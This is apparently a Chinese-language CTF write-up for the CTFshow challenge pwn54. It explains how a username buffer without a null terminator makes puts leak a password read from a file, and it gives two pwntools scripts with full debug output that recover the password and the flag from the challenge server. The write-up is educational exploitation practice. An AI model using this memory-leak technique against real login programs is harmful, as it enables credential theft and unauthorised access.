```
tasike@tasike-VM:~/Desktop$ chmod 777 pwn54
```

```
tasike@tasike-VM:~/Desktop$ file pwn54
pwn54: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=67746645f70a871e22de0646a5588837571ef698, not stripped
```

```
tasike@tasike-VM:~/Desktop$ checksec pwn54
[*] '/home/tasike/Desktop/pwn54'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

`32bit`，没有开启栈保护，堆栈不可执行

`ida`查看

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s1[64]; // [esp+0h] [ebp-1A0h] BYREF
  char v5[256]; // [esp+40h] [ebp-160h] BYREF
  char s[64]; // [esp+140h] [ebp-60h] BYREF
  FILE *stream; // [esp+180h] [ebp-20h]
  char *v8; // [esp+184h] [ebp-1Ch]
  int *p_argc; // [esp+194h] [ebp-Ch]

  p_argc = &argc;
  setvbuf(stdout, 0, 2, 0);
  memset(s, 0, sizeof(s));
  memset(v5, 0, sizeof(v5));
  memset(s1, 0, sizeof(s1));
  puts("==========CTFshow-LOGIN==========");
  puts("Input your Username:");
  fgets(v5, 256, stdin);
  v8 = strchr(v5, 10);
  if ( v8 )
    *v8 = 0;
  strcat(v5, ",\nInput your Password.");
  stream = fopen("/password.txt", "r");
  if ( !stream )
  {
    puts("/password.txt: No such file or directory.");
    exit(0);
  }
  fgets(s, 64, stream);
  printf("Welcome ");
  puts(v5);
  fgets(s1, 64, stdin);
  v5[0] = 0;
  if ( !strcmp(s1, s) )
  {
    puts("Welcome! Here's what you want:");
    flag();
  }
  else
  {
    puts("You has been banned!");
  }
  return 0;
}
```

> 17行：
>
> ```
>   fgets(v5, 256, stdin);
>   从标准输入中读入256个字节到v5中
> ```
>
> 18行：
>
> ```
>  v8 = strchr(v5, 10);
>  从字符串v5中查找ASCII码为10（也就是换行符），如果找到，返回指向换行符的指针，否则返回NULL
> ```
>
> 19~20行：
>
> ```
> if ( v8 )
>     *v8 = 0;
> 无论v8是谁，最终v8 = NULL,也就是指向换行符的指针被替换为指向'\0'的指针，也就是把字符串v5中的换行符替换成了'\0'；但是如果v5中没有换行符，那么v5就不会有'\0'
> ```
>
> 21行：
>
> ```
> strcat(v5, ",\nInput your Password.");
> 把",\nInput your Password."追加到v5后面
> ```
>
> 22~31行都太常见了，不解释
>
> 32行：
>
> ```
> v5[0] = 0
> ASCII码中0对应的字符为'\0'，因此这步就是把v5字符串置空
> ```
>
> 后面显然是`s1`要等于`s`，然后执行`flag`函数

跟进`flag`函数（很显然就是打印出flag的函数）

```c
int flag()
{
  char s[48]; // [esp+Ch] [ebp-3Ch] BYREF
  FILE *stream; // [esp+3Ch] [ebp-Ch]

  stream = fopen("/ctfshow_flag", "r");
  if ( !stream )
  {
    puts("/ctfshow_flag: No such file or directory.");
    exit(0);
  }
  fgets(s, 48, stream);
  printf("%s", s);
  return 0;
}
```



> 分析：`puts`遇到`\0`才停止。



编写`attck54.py`

第一步：

```python
from pwn import *
context(os = 'Linux', arch = 'i386', log_level = 'debug')
r = remote('pwn.challenge.ctf.show', 28222)
payload = b'a' * 0xFF + b'b'  # 这里不用cyclic(0x100)而用前面全是'a'后面跟一个'b'的写法主要是便于观察
r.sendline(payload)
r.interactive()
```

```
tasike@tasike-VM:~/Desktop$ python3 attack54.py
[+] Opening connection to pwn.challenge.ctf.show on port 28112: Done
[DEBUG] Sent 0x101 bytes:
    b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab\n'
[*] Switching to interactive mode
[DEBUG] Received 0x162 bytes:
    b'==========CTFshow-LOGIN==========\n'
    b'Input your Username:\n'
    b'Welcome aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,CTFshow_PWN_r00t_p@ssw0rd_1s_h3r3\n'
    b'\n'
==========CTFshow-LOGIN==========
Input your Username:
Welcome aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,CTFshow_PWN_r00t_p@ssw0rd_1s_h3r3

[DEBUG] Received 0x15 bytes:
    b'You has been banned!\n'
You has been banned!
[*] Got EOF while reading in interactive

```

会发现很奇怪的事情，明明时读入255个`'a'`和1个`'b'`，怎么`strcat`之后那个`b`给没了呢？

这就不得不说到字符数组：

```
正常的充满的字符数组，比如str[6] = "hello",事实上它是{'h','e','l','l','o','\0'}.
然后另一个字符串ttr = "China",事实上它是{'C','h','i','n','a','\0'}.
而puts函数是遇到'\0'停止
当strcat(str, ttr)之后，puts(str)显然是helloChina,也就是说，经过strcat之后，str变成了{'h','e','l','l','o','C','h','i','n','a','\0'}.
所以strcat进行追加的时候，在内存上是会把后面那个字符串的首元素覆盖前一个字符串的末尾的（因为正确字符串都是以'\0'结尾的）。
因此这就说明了为什么255个'a'和1个'b'但是strcat之后'b'给没了
```

我们可以轻松地数出password是33个字符

第二步：

```python
from pwn import *
context(os = 'Linux', arch = 'i386', log_level = 'debug')
r = remote('pwn.challenge.ctf.show', 28222)
payload = cyclic(0x100)
r.sendline(payload)
r.recvuntil(',')
password = r.recv(33)
print(password)
r.close()

r = remote('pwn.challenge.ctf.show', 28222)
r.sendline('tasike')
r.sendline(password)
r.interactive()
```

结果：
```
tasike@tasike-VM:~/Desktop$ python3 attack54.py
[+] Opening connection to pwn.challenge.ctf.show on port 28112: Done
[DEBUG] Sent 0x101 bytes:
    b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaac\n'
/home/tasike/Desktop/attack54.py:6: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.recvuntil(',')
[DEBUG] Received 0x177 bytes:
    b'==========CTFshow-LOGIN==========\n'
    b'Input your Username:\n'
    b'Welcome aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaa,CTFshow_PWN_r00t_p@ssw0rd_1s_h3r3\n'
    b'\n'
    b'You has been banned!\n'
b'CTFshow_PWN_r00t_p@ssw0rd_1s_h3r3'
[*] Closed connection to pwn.challenge.ctf.show port 28112
[+] Opening connection to pwn.challenge.ctf.show on port 28112: Done
/home/tasike/Desktop/attack54.py:12: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.sendline('tasike')
[DEBUG] Sent 0x7 bytes:
    b'tasike\n'
[DEBUG] Sent 0x22 bytes:
    b'CTFshow_PWN_r00t_p@ssw0rd_1s_h3r3\n'
[*] Switching to interactive mode
[DEBUG] Received 0x5c bytes:
    b'==========CTFshow-LOGIN==========\n'
    b'Input your Username:\n'
    b'Welcome tasike,\n'
    b'Input your Password.\n'
==========CTFshow-LOGIN==========
Input your Username:
Welcome tasike,
Input your Password.
[DEBUG] Received 0x4d bytes:
    b"Welcome! Here's what you want:\n"
    b'ctfshow{907f882b-a57f-4095-9164-d56a0b21601b}\n'
Welcome! Here's what you want:
ctfshow{907f882b-a57f-4095-9164-d56a0b21601b}
[*] Got EOF while reading in interactive
```



